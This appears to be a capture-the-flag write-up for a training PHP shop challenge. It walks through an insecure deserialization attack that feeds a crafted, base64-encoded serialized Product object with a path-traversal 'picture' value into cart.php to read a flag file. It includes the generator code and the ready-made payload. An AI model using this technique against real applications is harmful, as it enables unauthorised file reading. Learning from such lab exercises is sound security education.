## Challange
Read the flag in `/secret/flag.txt`. 
## Solution
In the source code we can see that the only function that can read a file is `getPicture()` in `Product.inc.php`. If we can alter the attribute `picture` we could inject the path `../../../secret/flag.txt` and read the content of the file through `file_get_contents`.

In `cart.php` if the isset `state` the code execute the function `toDict()` and return the result. In the normal behaviour `toDict()` is called from a `State` object but we can pass a serialized object of class `Product` which having the same method will return the content of the flag.
```php
if(isset($_REQUEST['token'])) {

    $state = $db->retrieveState($_REQUEST['token']);
    if(!$state) {
        http_response_code(400);
    } else {
        echo $state;
    }

} else if(isset($_REQUEST['state'])) {

    $state = State::restore($_REQUEST['state']);

    $enc = json_encode($state->toDict(), JSON_PRETTY_PRINT | JSON_NUMERIC_CHECK);

    if(isset($_REQUEST['save'])) {
        $tok = $db->saveState($enc);
        if(!$tok) {
            http_response_code(400);
        } else {
            echo json_encode(array("token" => $tok));
        }
    } else {
        echo $enc;
    }

} else {
    http_response_code(400);
}

?>
```
Supposing we can pass an altered `$_REQUEST['state']` the method `State::restore` does:
```php
static function restore($token) {
    return unserialize(gzuncompress(base64_decode($token)));
}
```
By crafting and executing this php code we can obtain a string which will return an object of class `Product` after being unserialized by `restore` method.
```php
<?php

class Product {

    private $id;
    private $name;
    private $description;
    private $picture = "../../../secret/flag.txt";
    private $price;
}

$r = new Product();
echo base64_encode(gzcompress(serialize($r)));

?>
```
By using Postman, send a POST request to `http://lolshop.training.jinblack.it/api/cart.php` with body of type form-data and parameter `state` `eJzztzK3Ugooyk8pTS5RsjK1qi62MjS0UmKACjFkpihZ+1kDBY2RBPMSc1MhwkYGSMIpqcXJRZkFJZn5eVBNZkiyBZnJJaVFQH1AXSZWSnp6+hBUnJpclFqin5aTmK5XUlECkjc0QdZXlJkMtq0WAJiQNKc=`.
This way after being restore, the method toDict() will be executed in the class Product and will return a JSON with this format:
```JSON
{
    "id": null,
    "name": null,
    "description": null,
    "picture": "YWN0Znt3ZWxjb21lX3RvX3RoZV9uZXdfd2ViXzA4MzZlZWY3OTE2NmI1ZGM4Yn0K",
    "price": null
}
```
`picture` is the base64 version of the content of the flag, by doing the decode64 we obtain the flag.